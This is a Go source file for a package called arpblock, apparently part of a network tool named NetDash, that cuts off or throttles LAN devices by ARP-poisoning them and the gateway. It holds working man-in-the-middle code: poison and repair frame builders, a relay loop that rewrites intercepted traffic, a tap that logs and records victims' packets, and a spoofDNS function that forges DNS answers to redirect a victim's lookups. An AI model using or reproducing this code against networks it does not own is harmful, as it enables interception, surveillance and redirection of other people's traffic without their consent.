// Package arpblock cuts or throttles a device's internet access from a host
// that is not the gateway, by ARP-impersonating the gateway toward that
// device: the victim sends us its gateway-bound frames. Blocked victims have
// those frames die here; rate-limited victims get them relayed to the real
// gateway (and downloads back the other way) through a token-bucket shaper,
// so the device stays online at kbit/s speeds. Only poisoned devices are
// affected, so everyone else on the LAN is untouched. On unblock, rate-clear
// (or shutdown) both ARP caches are repaired with the real mappings, and if
// NetDash crashes the poison expires with the normal ARP cache TTLs — the
// interference is fail-open by design.
package arpblock

import (
	"encoding/binary"
	"errors"
	"fmt"
	"log"
	"net"
	"netdash/internal/intel"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

const (
	etherTypeARP  = 0x0806
	etherTypeIPv4 = 0x0800
	arpOpRequest  = 1
	arpOpReply    = 2
	burst         = 3 // frames per direction per reconcile; the ticker refreshes
	burstPause    = 20 * time.Millisecond
	minBurstBytes = 12000 // token-bucket floor so tiny rates still move frames
)

// Limit is a per-device kbit/s cap (0 in a direction = unlimited) plus the
// victim MAC needed for the poison.
type Limit struct {
	MAC  string
	Down int
	Up   int
}

// entry is one poisoned device: how to reach it and how it is treated.
type entry struct {
	mac     net.HardwareAddr
	blocked bool
	down    int // kbit/s toward the device
	up      int // kbit/s from the device
	bd, bu  bucket
}

// bucket is a byte token bucket refilled from wall-clock deltas.
type bucket struct {
	tokens float64
	last   time.Time
	cap    float64
}

// take consumes n bytes at kbit/s rate. Unlimited (kbit<=0) always passes;
// the bucket starts full and is capped at one second of rate (min 12 KB).
func (b *bucket) take(now time.Time, kbit, n int) bool {
	if kbit <= 0 {
		return true
	}
	bps := float64(kbit) * 125
	if b.cap == 0 {
		b.cap = bps
		if b.cap < minBurstBytes {
			b.cap = minBurstBytes
		}
		b.tokens = b.cap
		b.last = now
	}
	b.tokens += now.Sub(b.last).Seconds() * bps
	b.last = now
	if b.tokens > b.cap {
		b.tokens = b.cap
	}
	if float64(n) > b.tokens {
		return false
	}
	b.tokens -= float64(n)
	return true
}

// Blocker maintains the poison set and sends Ethernet/ARP reply frames
// through the injected send func (a raw AF_PACKET socket in production).
type Blocker struct {
	ourMAC net.HardwareAddr
	gwIP   net.IP
	gwMAC  net.HardwareAddr
	send   func([]byte) error
	recv   func([]byte) (int, bool, error) // frame, was-ours-on-the-wire, err
	close  func()
	every  time.Duration

	mu      sync.Mutex
	active  map[string]*entry // victim ip -> state
	stopped bool
	running atomic.Bool // refresh ticker + relay loop are still alive
	stop    chan struct{}
	done    chan struct{}
	fdone   chan struct{}

	ourIP net.IP // our IPv4; ARP requests from it are never answered
	maxTx int    // largest relayable frame (iface MTU + eth header)

	// tap is called with the ORIGINAL frame (before rewrite) for every
	// relayed packet: intel log + pcap recording hang off it. spoof answers
	// matching DNS queries instead of relaying them (domain -> IP, or "").
	tap   func(ip string, up bool, frame []byte)
	spoof func(domain string) string

	// relay counters (diagnostics for the arp bridge shaper)
	stRx, stUp, stDown, stRate, stBlock, stNoEntry, stTxErr  atomic.Uint64
	stNonIp, stNotOurs, stTooLong, stArpAns, stSpoof, stFrag atomic.Uint64
}

// SetTap installs the relay observer (nil to remove). Safe while running.
func (b *Blocker) SetTap(fn func(ip string, up bool, frame []byte)) {
	b.mu.Lock()
	b.tap = fn
	b.mu.Unlock()
}

// SetSpoof installs the DNS spoof matcher (nil to remove). Safe while running.
func (b *Blocker) SetSpoof(fn func(domain string) string) {
	b.mu.Lock()
	b.spoof = fn
	b.mu.Unlock()
}

// New builds a Blocker around an explicit sender; production code should use
// Open, which also resolves the interface, MACs and raw socket.
func New(ourMAC net.HardwareAddr, gwIP net.IP, gwMAC net.HardwareAddr, send func([]byte) error, every time.Duration) *Blocker {
	if every <= 0 {
		every = time.Second
	}
	return &Blocker{
		ourMAC: ourMAC,
		gwIP:   gwIP.To4(),
		gwMAC:  gwMAC,
		send:   send,
		every:  every,
		maxTx:  1514,
		active: map[string]*entry{},
		stop:   make(chan struct{}),
		done:   make(chan struct{}),
		fdone:  make(chan struct{}),
	}
}

// replyFrame builds one 42-byte Ethernet II + ARP reply.
func replyFrame(dst, src, sha net.HardwareAddr, spa net.IP, tha net.HardwareAddr, tpa net.IP) []byte {
	f := make([]byte, 42)
	copy(f[0:6], dst)
	copy(f[6:12], src)
	binary.BigEndian.PutUint16(f[12:14], etherTypeARP)
	binary.BigEndian.PutUint16(f[14:16], 1) // hardware type: ethernet
	binary.BigEndian.PutUint16(f[16:18], 0x0800)
	f[18] = 6
	f[19] = 4
	binary.BigEndian.PutUint16(f[20:22], arpOpReply)
	copy(f[22:28], sha)
	copy(f[28:32], spa.To4())
	copy(f[32:38], tha)
	copy(f[38:42], tpa.To4())
	return f
}

// poisonFrames makes the victim believe we are the gateway and the gateway
// believe the victim is at our MAC, so the victim's traffic detours to us.
func (b *Blocker) poisonFrames(ip net.IP, mac net.HardwareAddr) [][]byte {
	toVictim := replyFrame(mac, b.ourMAC, b.ourMAC, b.gwIP, mac, ip)
	toGateway := replyFrame(b.gwMAC, b.ourMAC, b.ourMAC, ip, b.gwMAC, b.gwIP)
	return [][]byte{toVictim, toGateway}
}

// repairFrames restore the real mappings in both directions.
func (b *Blocker) repairFrames(ip net.IP, mac net.HardwareAddr) [][]byte {
	toVictim := replyFrame(mac, b.gwMAC, b.gwMAC, b.gwIP, mac, ip)
	toGateway := replyFrame(b.gwMAC, mac, mac, ip, b.gwMAC, b.gwIP)
	return [][]byte{toVictim, toGateway}
}

// sendBurst writes every frame `burst` times with a small pause between
// rounds so the pair lands in different Wi-Fi transmissions.
func (b *Blocker) sendBurst(frames [][]byte) error {
	for r := 0; r < burst; r++ {
		if r > 0 {
			time.Sleep(burstPause)
		}
		for _, f := range frames {
			if err := b.send(f); err != nil {
				return err
			}
		}
	}
	return nil
}

// SetState reconciles the poison set to the union of blocked victims and
// rate-limited victims: blocked entries drop every frame, limited entries
// are relayed through the token-bucket shaper. Newly poisoned victims get a
// poison burst, removed ones a repair burst; rate-only changes are silent.
// Sending errors are returned but state still converges — the ticker retries
// poisoned entries every interval.
func (b *Blocker) SetState(blocked map[string]string, limited map[string]Limit) error {
	b.mu.Lock()
	defer b.mu.Unlock()
	if b.stopped {
		return fmt.Errorf("blocker stopped")
	}
	var errs []string

	next := make(map[string]*entry, len(blocked)+len(limited))
	for ip, macs := range blocked {
		hw, err := net.ParseMAC(macs)
		if err != nil {
			errs = append(errs, ip+": "+err.Error())
			continue
		}
		next[ip] = &entry{mac: hw, blocked: true}
	}
	for ip, lim := range limited {
		if _, skip := next[ip]; skip {
			continue // a blocked device wins over its own limit
		}
		hw, err := net.ParseMAC(lim.MAC)
		if err != nil {
			errs = append(errs, ip+": "+err.Error())
			continue
		}
		next[ip] = &entry{mac: hw, down: lim.Down, up: lim.Up}
	}

	// preserve shaper state for victims that stay poisoned; reset only the
	// direction whose rate changed (re-derives its burst cap and refills)
	for ip, old := range b.active {
		fresh, keep := next[ip]
		if !keep || old.mac.String() != fresh.mac.String() {
			continue
		}
		fresh.bd, fresh.bu = old.bd, old.bu
		if old.down != fresh.down {
			fresh.bd = bucket{}
		}
		if old.up != fresh.up {
			fresh.bu = bucket{}
		}
	}

	for ip, old := range b.active {
		fresh, keep := next[ip]
		if keep && old.mac.String() == fresh.mac.String() {
			continue
		}
		if err := b.sendBurst(b.repairFrames(net.ParseIP(ip), old.mac)); err != nil {
			errs = append(errs, err.Error())
		}
		if keep { // MAC changed: re-poison with the new one
			if err := b.sendBurst(b.poisonFrames(net.ParseIP(ip), fresh.mac)); err != nil {
				errs = append(errs, err.Error())
			}
		}
	}
	for ip, fresh := range next {
		if _, was := b.active[ip]; !was {
			if err := b.sendBurst(b.poisonFrames(net.ParseIP(ip), fresh.mac)); err != nil {
				errs = append(errs, err.Error())
			}
		}
	}
	b.active = next
	if len(errs) > 0 {
		return fmt.Errorf("arp send: %s", strings.Join(errs, "; "))
	}
	return nil
}

// Repair sends cache-repair frames for ip:mac pairs that must no longer be
// poisoned (startup cleanup of a crashed previous run, etc.).
func (b *Blocker) Repair(stale map[string]string) error {
	b.mu.Lock()
	defer b.mu.Unlock()
	if b.stopped {
		return nil
	}
	var errs []string
	for ip, macs := range stale {
		if _, still := b.active[ip]; still {
			continue
		}
		hw, err := net.ParseMAC(macs)
		if err != nil {
			continue
		}
		if err := b.sendBurst(b.repairFrames(net.ParseIP(ip), hw)); err != nil {
			errs = append(errs, err.Error())
		}
	}
	if len(errs) > 0 {
		return fmt.Errorf("arp repair: %s", strings.Join(errs, "; "))
	}
	return nil
}

// Active returns a copy of the currently poisoned ip -> mac set (blocked and
// limited alike) — used for crash cleanup across runs.
func (b *Blocker) Active() map[string]string {
	b.mu.Lock()
	defer b.mu.Unlock()
	out := make(map[string]string, len(b.active))
	for ip, e := range b.active {
		out[ip] = e.mac.String()
	}
	return out
}

// ActiveBlocked returns only the blocked subset of the poison set, so
// schedule logic can tell "enforced blocks" apart from "rate-limited".
func (b *Blocker) ActiveBlocked() map[string]string {
	b.mu.Lock()
	defer b.mu.Unlock()
	out := map[string]string{}
	for ip, e := range b.active {
		if e.blocked {
			out[ip] = e.mac.String()
		}
	}
	return out
}

// Start runs the refresh ticker that keeps re-asserting the poison toward
// every poisoned victim (their OS and the real gateway re-announce too) and,
// when a receiver is wired in, the shaper/relay loop for rate limits.
func (b *Blocker) Start() {
	b.running.Store(true)
	if b.recv != nil {
		go b.forward()
	}
	go func() {
		defer close(b.done)
		defer b.running.Store(false)
		t := time.NewTicker(b.every)
		defer t.Stop()
		for {
			select {
			case <-b.stop:
				return
			case <-t.C:
				b.mu.Lock()
				var frames [][]byte
				for ip, e := range b.active {
					frames = append(frames, b.poisonFrames(net.ParseIP(ip), e.mac)...)
				}
				b.mu.Unlock()
				for _, f := range frames {
					if err := b.send(f); err != nil {
						return // socket gone: stop refreshing
					}
				}
			}
		}
	}()
}

// Alive reports whether the poison refresh ticker and relay loop are still
// running. Both exit permanently on socket errors (carrier loss, wifi off,
// suspend) without cleanup, so supervision must reopen the bridge when this
// turns false — otherwise limits/intel/spoof silently die until restart.
func (b *Blocker) Alive() bool {
	b.mu.Lock()
	defer b.mu.Unlock()
	return !b.stopped && b.running.Load()
}

// Stop halts the ticker and relay, repairs every poisoned cache and releases
// the sockets. Safe to call twice.
func (b *Blocker) Stop() {
	b.mu.Lock()
	if b.stopped {
		b.mu.Unlock()
		return
	}
	b.stopped = true
	close(b.stop)
	frames := [][]byte{}
	for ip, e := range b.active {
		frames = append(frames, b.repairFrames(net.ParseIP(ip), e.mac)...)
	}
	b.active = map[string]*entry{}
	b.mu.Unlock()
	<-b.done
	if b.recv != nil {
		select { // relay exits within its recv timeout (or right away if never started)
		case <-b.fdone:
		case <-time.After(time.Second):
		}
	}
	for r := 0; r < burst; r++ {
		if r > 0 {
			time.Sleep(burstPause)
		}
		for _, f := range frames {
			_ = b.send(f)
		}
	}
	if b.close != nil {
		b.close()
	}
}

// forward is the relay/shaper loop: it reads frames the poison sends our way
// and either drops them (blocked or unknown) or rewrites the destination MAC
// and relays them through the token bucket (limited). Send failures drop the
// single frame and continue — the loop only dies with the socket or Stop,
// and it logs a stats line every 5s while active so stalls are observable.
func (b *Blocker) forward() {
	defer close(b.fdone)
	defer b.running.Store(false)
	buf := make([]byte, 4096)
	lastLog := time.Now()
	lastSig := ""
	errStreak := 0
	sendOut := func(fr []byte) {
		if err := b.send(fr); err != nil {
			b.stTxErr.Add(1)
			errStreak++
			if errStreak == 1 || errStreak%20 == 0 {
				log.Printf("arp bridge: relay send failed (%d so far): %v", errStreak, err)
			}
		} else {
			errStreak = 0
		}
	}
	for {
		select {
		case <-b.stop:
			return
		default:
		}
		n, outgoing, err := b.recv(buf)
		if err == nil {
			if !outgoing && n >= 14 {
				if f := b.handleFrame(buf[:n]); f != nil {
					// GRO-coalesced packets carry the first segment's L4
					// checksum — it no longer matches the merged payload,
					// so repair it before any receiver validates and drops.
					if etherType(f) == etherTypeIPv4 {
						if len(f) >= 34 {
							if total := int(binary.BigEndian.Uint16(f[16:18])); total >= 20 && 14+total <= len(f) {
								fixL4Checksum(f[14 : 14+total])
							}
						}
					}
					if len(f) > b.maxTx {
						// GRO jumbos and ONT-sized frames: fragment for the
						// LAN instead of dropping ~20% of a download.
						frags, ferr := fragmentIPv4(f, b.maxTx)
						if ferr != nil {
							b.stTooLong.Add(1)
							if b.stTooLong.Load() <= 5 {
								log.Printf("arp bridge: oversize frame rx=%d > maxTx=%d unfragmentable: %v",
									len(f), b.maxTx, ferr)
							}
						} else {
							b.stFrag.Add(uint64(len(frags)))
							for _, fr := range frags {
								sendOut(fr)
							}
						}
					} else {
						sendOut(f)
					}
				}
			}
		} else {
			select {
			case <-b.stop:
				return
			default:
			}
			// EINTR: Go runtime signals (SIGURG preemption) interrupt raw
			// blocking syscalls — retry, the socket is still healthy.
			if isTimeout(err) || errors.Is(err, syscall.EINTR) {
				continue
			}
			log.Printf("arp bridge: relay stopped: %v", err)
			return
		}
		if time.Since(lastLog) >= 5*time.Second {
			sig := b.statsSig()
			if sig != lastSig {
				log.Printf("arp bridge: %s", sig)
				lastSig = sig
				lastLog = time.Now()
			}
		}
	}
}

// statsSig is a compact counter summary for the periodic log line.
func (b *Blocker) statsSig() string {
	b.mu.Lock()
	on := ""
	for ip := range b.active {
		on += ip + ","
	}
	b.mu.Unlock()
	if len(on) > 0 {
		on = on[:len(on)-1]
	}
	return fmt.Sprintf("rx=%d up=%d down=%d rateDrop=%d blockDrop=%d noEntry=%d tooLong=%d nonIp=%d notOurs=%d arpAns=%d spoof=%d frag=%d txErr=%d on=[%s]",
		b.stRx.Load(), b.stUp.Load(), b.stDown.Load(), b.stRate.Load(),
		b.stBlock.Load(), b.stNoEntry.Load(), b.stTooLong.Load(),
		b.stNonIp.Load(), b.stNotOurs.Load(), b.stArpAns.Load(), b.stSpoof.Load(), b.stFrag.Load(), b.stTxErr.Load(), on)
}

// fixL4Checksum recomputes the TCP/UDP checksum of an IPv4 packet in place.
// GRO merges consecutive segments but leaves the first segment's checksum in
// the header (skb->ip_summed says "trust me"), so raw taps see a stale value;
// any receiver that validates will drop the frame. UDP with a zero checksum
// (legal in IPv4) is left disabled.
func fixL4Checksum(p []byte) {
	if len(p) < 20 {
		return
	}
	ihl := int(p[0]&0x0f) * 4
	if ihl < 20 || ihl > len(p) {
		return
	}
	proto := p[9]
	if proto != 6 && proto != 17 {
		return
	}
	seg := p[ihl:]
	if len(seg) < 8 {
		return
	}
	if proto == 17 && seg[6] == 0 && seg[7] == 0 {
		return // checksum disabled by the sender — keep it that way
	}
	var sum uint32
	for i := 12; i < 20; i += 2 { // pseudo-header: source + destination
		sum += uint32(binary.BigEndian.Uint16(p[i : i+2]))
	}
	sum += uint32(proto)
	sum += uint32(len(seg))
	off := 16 // TCP checksum offset
	if proto == 17 {
		off = 6 // UDP
	}
	if off+2 > len(seg) {
		return
	}
	seg[off], seg[off+1] = 0, 0
	for i := 0; i+1 < len(seg); i += 2 {
		sum += uint32(binary.BigEndian.Uint16(seg[i : i+2]))
	}
	if len(seg)%2 == 1 {
		sum += uint32(seg[len(seg)-1]) << 8
	}
	for sum>>16 != 0 {
		sum = sum&0xffff + sum>>16
	}
	c := ^uint16(sum)
	if proto == 17 && c == 0 {
		c = 0xffff // UDP 0 means "no checksum" — never emit it
	}
	binary.BigEndian.PutUint16(seg[off:off+2], c)
}

// fragmentIPv4 splits an oversize ethernet+IPv4 frame into fragments no
// larger than maxFrame. The original IP header is preserved per fragment
// (id, addresses, TTL) with DF cleared and the fragment offset/MF flag set;
// L4 checksums are repaired first — GRO packets carry a stale value.
// Reassembly on the receiver reproduces the original packet exactly.
func fragmentIPv4(f []byte, maxFrame int) ([][]byte, error) {
	if len(f) < 34 || etherType(f) != etherTypeIPv4 {
		return nil, errors.New("not an ipv4 frame")
	}
	ihl := int(f[14]&0x0f) * 4
	if ihl != 20 {
		return nil, errors.New("ip options not supported")
	}
	total := int(binary.BigEndian.Uint16(f[16:18]))
	if total < ihl || 14+total > len(f) {
		return nil, errors.New("bad ip total length")
	}
	fixL4Checksum(f[14 : 14+total])

	maxPayload := maxFrame - 14 - 20
	if maxPayload < 8 {
		return nil, errors.New("maxFrame too small")
	}
	maxPayload &^= 7 // fragment offsets are in 8-byte units
	payload := f[34 : 14+total]
	if len(payload) <= maxPayload {
		return [][]byte{append([]byte(nil), f[:14+total]...)}, nil
	}
	orig := append([]byte(nil), f[14:34]...)
	frags := make([][]byte, 0, (len(payload)+maxPayload-1)/maxPayload)
	for off := 0; off < len(payload); off += maxPayload {
		end := off + maxPayload
		if end > len(payload) {
			end = len(payload)
		}
		fr := make([]byte, 14+20+end-off)
		copy(fr[0:14], f[0:14])
		copy(fr[14:34], orig)
		ip := fr[14:]
		binary.BigEndian.PutUint16(ip[2:4], uint16(20+end-off))
		frag := uint16(off / 8)
		if end < len(payload) {
			frag |= 0x2000 // more fragments follow; DF cleared
		}
		binary.BigEndian.PutUint16(ip[6:8], frag)
		binary.BigEndian.PutUint16(ip[10:12], 0)
		binary.BigEndian.PutUint16(ip[10:12], ipChecksum(ip[:20]))
		copy(ip[20:], payload[off:end])
		frags = append(frags, fr)
	}
	return frags, nil
}

// spoofDNS answers a relayed DNS query when the name matches a spoof rule:
// the original query is swallowed and a forged A-record response (from the
// queried server's IP, with the query's transaction id) goes straight back
// to the victim. Returns nil when the frame is not a matching query.
func (b *Blocker) spoofDNS(f []byte, victimIP net.IP, victimMAC net.HardwareAddr) []byte {
	if len(f) < 54 || etherType(f) != etherTypeIPv4 {
		return nil
	}
	ihl := int(f[14]&0x0f) * 4
	if ihl < 20 || 14+ihl+8 > len(f) || f[23] != 17 { // UDP only
		return nil
	}
	l4 := 14 + ihl
	if binary.BigEndian.Uint16(f[l4+2:l4+4]) != 53 {
		return nil // not a query headed for :53
	}
	payload := f[l4+8:]
	if ql := int(binary.BigEndian.Uint16(f[l4+4 : l4+6])); ql > 0 && ql <= len(payload) {
		payload = payload[:ql]
	}
	name := intel.DNSQueryName(payload)
	if name == "" {
		return nil
	}
	ipStr := b.spoof(name)
	if ipStr == "" {
		return nil
	}
	spoofIP := net.ParseIP(ipStr).To4()
	if spoofIP == nil {
		return nil
	}
	qend := intel.QuestionEnd(payload)
	if qend < 16 {
		return nil
	}
	dns := make([]byte, 0, qend+16)
	dns = append(dns, payload[0:2]...) // transaction id echo
	dns = append(dns, 0x81, 0x80)      // response, recursion desired+available
	dns = append(dns, 0x00, 0x01)      // qdcount
	dns = append(dns, 0x00, 0x01)      // ancount
	dns = append(dns, 0x00, 0x00)      // nscount
	dns = append(dns, 0x00, 0x00)      // arcount
	dns = append(dns, payload[12:qend]...)
	dns = append(dns, 0xc0, 0x0c)             // name: pointer to question
	dns = append(dns, 0x00, 0x01, 0x00, 0x01) // type A, class IN
	dns = append(dns, 0x00, 0x00, 0x00, 0x00) // ttl 0
	dns = append(dns, 0x00, 0x04)             // rdlength
	dns = append(dns, spoofIP...)

	frame := make([]byte, 14+20+8+len(dns))
	copy(frame[0:6], victimMAC)
	copy(frame[6:12], b.ourMAC)
	binary.BigEndian.PutUint16(frame[12:14], etherTypeIPv4)
	ip := frame[14:]
	ip[0] = 0x45
	binary.BigEndian.PutUint16(ip[2:4], uint16(20+8+len(dns)))
	binary.BigEndian.PutUint16(ip[4:6], 0x1337)
	binary.BigEndian.PutUint16(ip[6:8], 0x4000)
	ip[8] = 64
	ip[9] = 17 // UDP
	copy(ip[12:16], net.IP(f[30:34]).To4())
	copy(ip[16:20], victimIP.To4())
	binary.BigEndian.PutUint16(ip[10:12], ipChecksum(ip[:20]))
	udp := frame[34:]
	binary.BigEndian.PutUint16(udp[0:2], 53)
	binary.BigEndian.PutUint16(udp[2:4], binary.BigEndian.Uint16(f[l4:l4+2]))
	binary.BigEndian.PutUint16(udp[4:6], uint16(8+len(dns)))
	copy(udp[8:], dns)
	return frame
}

// ipChecksum computes the RFC1071 internet checksum.
func ipChecksum(b []byte) uint16 {
	var sum uint32
	for i := 0; i+1 < len(b); i += 2 {
		sum += uint32(binary.BigEndian.Uint16(b[i : i+2]))
	}
	if len(b)%2 == 1 {
		sum += uint32(b[len(b)-1]) << 8
	}
	for sum>>16 != 0 {
		sum = sum&0xffff + sum>>16
	}
	return ^uint16(sum)
}

// handleFrame inspects one received frame: frames for a poisoned victim are
// rewritten to their real destination and released through the per-direction
// token bucket; blocked or unknown frames return nil (dropped). Callers hold
// no lock — this takes b.mu itself.
func (b *Blocker) handleFrame(f []byte) []byte {
	if len(f) < 14 {
		return nil
	}
	switch etherType(f) {
	case etherTypeARP:
		return b.handleARP(f)
	case etherTypeIPv4:
		return b.relayIPv4(f)
	default:
		b.stNonIp.Add(1)
		return nil
	}
}

// handleARP answers ARP requests only in the two poison directions: the
// gateway asking for a poisoned victim (its neighbor entry goes stale because
// the victim's real frames never reach it — a solicited reply is accepted
// where our unsolicited spoof is ignored) and a poisoned victim asking for
// the gateway. Requests from our own IP are never answered.
func (b *Blocker) handleARP(f []byte) []byte {
	if len(f) < 42 || binary.BigEndian.Uint16(f[20:22]) != arpOpRequest {
		return nil // short or not a request: the kernel owns replies
	}
	if string(f[0:6]) != string(b.ourMAC) && !isBroadcast(f[0:6]) {
		return nil
	}
	sha := f[22:28]
	spa := net.IP(f[28:32]).To4()
	tpa := net.IP(f[38:42]).To4()
	if spa == nil || tpa == nil {
		return nil
	}
	if b.ourIP != nil && spa.Equal(b.ourIP) {
		return nil // never answer our own probes
	}
	b.mu.Lock()
	defer b.mu.Unlock()
	if b.stopped {
		return nil
	}
	var answer net.IP
	switch {
	case b.gwIP.Equal(spa):
		if _, ok := b.active[tpa.String()]; ok {
			answer = tpa // gateway wants a victim: "victim is at my MAC"
		}
	case tpa.Equal(b.gwIP):
		if _, ok := b.active[spa.String()]; ok {
			answer = b.gwIP // victim wants the gateway: "gateway is at my MAC"
		}
	}
	if answer == nil {
		return nil
	}
	b.stArpAns.Add(1)
	return replyFrame(f[6:12], b.ourMAC, b.ourMAC, answer, sha, spa)
}

func isBroadcast(mac net.HardwareAddr) bool {
	for _, c := range mac {
		if c != 0xff {
			return false
		}
	}
	return true
}

// relayIPv4 shapes one poisoned victim's traffic: frames are rewritten in
// BOTH ethernet addresses (destination for routing, source to our own MAC —
// home APs drop relayed frames whose inner source is not the transmitting
// station) and released through the per-direction token bucket.
func (b *Blocker) relayIPv4(f []byte) []byte {
	if len(f) < 42 {
		b.stNonIp.Add(1)
		return nil
	}
	if string(f[0:6]) != string(b.ourMAC) {
		b.stNotOurs.Add(1)
		return nil // not a frame the poison attracted to us
	}
	srcIP := net.IPv4(f[26], f[27], f[28], f[29])
	dstIP := net.IPv4(f[30], f[31], f[32], f[33])

	b.mu.Lock()
	defer b.mu.Unlock()
	if b.stopped {
		return nil
	}
	now := time.Now()
	if e, ok := b.active[srcIP.String()]; ok && !e.blocked {
		b.stRx.Add(1)
		if b.tap != nil {
			b.tap(srcIP.String(), true, f)
		}
		if b.spoof != nil {
			if rsp := b.spoofDNS(f, srcIP, e.mac); rsp != nil {
				b.stSpoof.Add(1)
				return rsp
			}
		}
		if !e.bu.take(now, e.up, len(f)) {
			b.stRate.Add(1)
			return nil
		}
		b.stUp.Add(1)
		copy(f[0:6], b.gwMAC)   // up: -> real gateway
		copy(f[6:12], b.ourMAC) // up: source -> us (never relay a spoofed source)
		return f
	}
	if e, ok := b.active[dstIP.String()]; ok {
		b.stRx.Add(1)
		if e.blocked {
			b.stBlock.Add(1)
			return nil
		}
		if b.tap != nil {
			b.tap(dstIP.String(), false, f)
		}
		if !e.bd.take(now, e.down, len(f)) {
			b.stRate.Add(1)
			return nil
		}
		b.stDown.Add(1)
		copy(f[0:6], e.mac)     // down: -> victim
		copy(f[6:12], b.ourMAC) // down: source -> us (gateway frames would trip AP loop guards)
		return f
	}
	b.stNoEntry.Add(1)
	return nil
}

func etherType(f []byte) int {
	return int(binary.BigEndian.Uint16(f[12:14]))
}

// isTimeout reports a non-fatal receive timeout (SO_RCVTIMEO → EAGAIN).
func isTimeout(err error) bool {
	if errors.Is(err, syscall.EAGAIN) || errors.Is(err, syscall.EWOULDBLOCK) {
		return true
	}
	var ne net.Error
	return errors.As(err, &ne) && ne.Timeout()
}

// ---- capability discovery (production wiring) ----

// ErrNotCapable carries the human-readable reason blocking is unavailable.
type ErrNotCapable struct{ Reason string }

func (e *ErrNotCapable) Error() string { return e.Reason }

// Open resolves the LAN interface, our and the gateway's MACs, verifies
// forwarding is off and opens a raw AF_PACKET socket bound to the interface.
// On failure the error is an *ErrNotCapable with a status-ready reason.
func Open(gwIPStr string) (*Blocker, error) {
	gwIP := net.ParseIP(gwIPStr).To4()
	if gwIP == nil {
		return nil, &ErrNotCapable{"gateway ip unknown"}
	}
	gwMAC, err := arpTableMAC(gwIP)
	if err != nil {
		return nil, &ErrNotCapable{"gateway mac unknown (waiting for ARP traffic)"}
	}
	if v, err := readIPForward(); err == nil && v != "0" {
		return nil, &ErrNotCapable{"ip forwarding is enabled — devices would not be cut off (sysctl net.ipv4.ip_forward=0)"}
	}
	iface, ourMAC, err := pickIface(gwIP)
	if err != nil {
		return nil, &ErrNotCapable{err.Error()}
	}
	send, recv, closeFn, err := openSocket(&iface)
	if err != nil {
		return nil, &ErrNotCapable{"raw packet access denied — need CAP_NET_RAW (sudo setcap cap_net_raw,cap_net_admin+ep <netdash binary>)"}
	}
	b := New(ourMAC, gwIP, gwMAC, send, time.Second)
	b.close = closeFn
	b.recv = recv
	b.ourIP = ifaceIPv4(&iface)
	if old, err := setMTU(iface.Name, 2304); err != nil {
		log.Printf("arp bridge: could not raise %s mtu: %v", iface.Name, err)
	} else {
		b.maxTx = 2304 + 14 // the ONT sends Wi-Fi-sized frames; relay them too
		if old < 2304 {
			log.Printf("arp bridge: %s mtu %d -> 2304", iface.Name, old)
		}
	}
	return b, nil
}

// ifaceIPv4 returns the interface's first IPv4 address, or nil.
func ifaceIPv4(iface *net.Interface) net.IP {
	addrs, err := iface.Addrs()
	if err != nil {
		return nil
	}
	for _, a := range addrs {
		if ipn, ok := a.(*net.IPNet); ok {
			if v := ipn.IP.To4(); v != nil {
				return v
			}
		}
	}
	return nil
}

// arpTableMAC reads the kernel neighbor table for the gateway's MAC.
func arpTableMAC(ip net.IP) (net.HardwareAddr, error) {
	data, err := os.ReadFile("/proc/net/arp")
	if err != nil {
		return nil, err
	}
	want := ip.String()
	for _, line := range strings.Split(string(data), "\n") {
		f := strings.Fields(line)
		if len(f) < 4 || f[0] != want {
			continue
		}
		if f[2] == "0x0" { // incomplete
			continue
		}
		if mac, err := net.ParseMAC(f[3]); err == nil {
			return mac, nil
		}
	}
	return nil, fmt.Errorf("%s not in arp table", want)
}

// pickIface finds the up interface whose IPv4 subnet contains the gateway.
func pickIface(gwIP net.IP) (net.Interface, net.HardwareAddr, error) {
	ifs, err := net.Interfaces()
	if err != nil {
		return net.Interface{}, nil, err
	}
	for _, ifc := range ifs {
		if ifc.Flags&net.FlagUp == 0 || ifc.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, err := ifc.Addrs()
		if err != nil {
			continue
		}
		for _, a := range addrs {
			ipn, ok := a.(*net.IPNet)
			if !ok || ipn.IP.To4() == nil {
				continue
			}
			if ipn.Contains(gwIP) {
				return ifc, ifc.HardwareAddr, nil
			}
		}
	}
	return net.Interface{}, nil, fmt.Errorf("no interface reaches the gateway")
}

func readIPForward() (string, error) {
	b, err := os.ReadFile("/proc/sys/net/ipv4/ip_forward")
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(string(b)), nil
}
